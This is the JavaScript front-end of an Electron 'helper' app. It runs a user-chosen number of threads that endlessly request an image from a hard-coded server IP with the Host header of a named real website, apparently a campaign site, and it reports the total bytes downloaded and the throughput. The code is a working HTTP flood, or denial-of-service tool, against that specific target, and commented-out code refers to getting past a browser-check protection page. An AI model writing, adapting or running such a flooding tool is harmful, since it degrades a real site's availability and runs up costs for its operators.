const shell = require('electron').shell;
const Async = require('async');
const request = require('request');

let printInterval;
let currentHelper;
let startTime;
let lock = false;
let page = $('html, body');
let stop = true;
let count = 0;

let oldLog = console.log;
console.log = function (message) {
  oldLog.apply(console, arguments);
  $('#console-output').text($('#console-output').text() + arguments[0] + '\n');
  var elem = document.getElementById('console-output-container');
  elem.scrollTop = elem.scrollHeight;
};

window.onerror = function (error, url, line) {
  console.log(error);
};

// open links externally by default
$(document).on('click', 'a[href^="http"]', function (event) {
  event.preventDefault();
  shell.openExternal(this.href);
});

let pollingInterval = setInterval(function () {
  let a = $('#star-container iframe').contents().find('a');
  if (!a.length) {
    return;
  }
  a.bind('click', function (event) {
    event.preventDefault();
    shell.openExternal(this.href);
  });
  clearInterval(pollingInterval);
}, 200);

let spawnHelper = function (threads, /*options,*/ callback) {
  stop = false;
  startTime = Date.now();
  /*
  var headers = {};
  var tmp = options.split('\'');
  for (var i in tmp) {
    if (i >= 3 && i % 2 == 1) {
      var kv = tmp[i].split(': ');
      headers[kv[0].trim()] = kv[1].trim();
    }
  }
  console.log('Request headers: ' + JSON.stringify(headers));
  */
  for (var i = 0; i < threads; i++) {
    Async.forever(
      function (next) {
        if (stop) {
          return next(new Error('Stopped'));
        }
        request.get({
          url: 'http://52.220.20.197/assets/i/carrielam/p1.png',
          headers: {
            'Host': 'carrielam.1km.hk'
          }
        }, function (error, response, body) {
          /*
          if (body && body.indexOf('Checking your browser before accessing') !== -1) {
            console.log('!!! Please update cURL parameters !!!');
            stopHelper(function () {});
            return next(new Error('Stopped'));
          }
          */
          if (error) {
            console.log(error);
          } else {
            count += body.length;
          }
          next();
        });
      },
      function (err) {}
    );
  }
  printInterval = setInterval(function () {
    var seconds = (Date.now() - startTime) / 1000;
    var mbs = count / 1024 / 1024;
    var speed = mbs / seconds;
    mbs = Math.round(mbs * 100) / 100;
    speed = Math.round(speed * 100) / 100;
    seconds = Math.round(seconds);
    console.log(`+ Total RX: ${mbs}MB`);
    console.log(`+ Elapsed time: ${seconds}s, Avg Speed: ${speed} MB/s`);
  }, 1000);
  callback([]);
};

let stopHelper = function (callback) {
  clearInterval(printInterval);
  var seconds = (Date.now() - startTime) / 1000;
  var mbs = count / 1024 / 1024;
  var speed = mbs / seconds;
  mbs = Math.round(mbs * 100) / 100;
  speed = Math.round(speed * 100) / 100;
  seconds = Math.round(seconds);
  console.log(`~~ Total RX: ${mbs}MB ~~`);
  console.log(`~~ Elapsed time: ${seconds}s, Avg Speed: ${speed} MB/s ~~`);
  stop = true;
  count = 0;
  startTime = null;
  callback();
};

let updateUI = function () {
  if (currentHelper) {
    $('#thread-count').attr('disabled', true);
    $('#button-text').text('Stop helper');
    page.animate({
      scrollTop: $(document).height() - $(window).height()
    }, 1000, 'easeOutQuint');
  } else {
    $('#thread-count').removeAttr('disabled');
    $('#button-text').text('Start helper');
  }
};

let toggleLock = function (l) {
  lock = l;
  if (lock) {
    $('#toggle-btn').addClass('disabled');
  } else {
    $('#toggle-btn').removeClass('disabled');
  }
};

let toggleCLSHelper = function () {
  if (lock) {
    return;
  }
  toggleLock(true);
  var threads = parseInt($('#thread-count').val()) || 1;
  // var options = $('#curl-request').val();
  if (!currentHelper) {
    spawnHelper(threads, /*options,*/ function (client) {
      currentHelper = client;
      toggleLock(false);
      updateUI();
      console.log(`==* Helper started - threads: ${threads} *==`);
    });
  } else {
    stopHelper(function (error) {
      if (error) {
        console.log(error);
      }
      currentHelper = null;
      toggleLock(false);
      updateUI();
      console.log('==* Helper client stopped *==');
    });
  }
};

$('#main-form').submit(function (event) {
  event.preventDefault();
  toggleCLSHelper();
});

page.on('scroll mousedown wheel DOMMouseScroll mousewheel keyup touchmove', function () {
  page.stop();
});
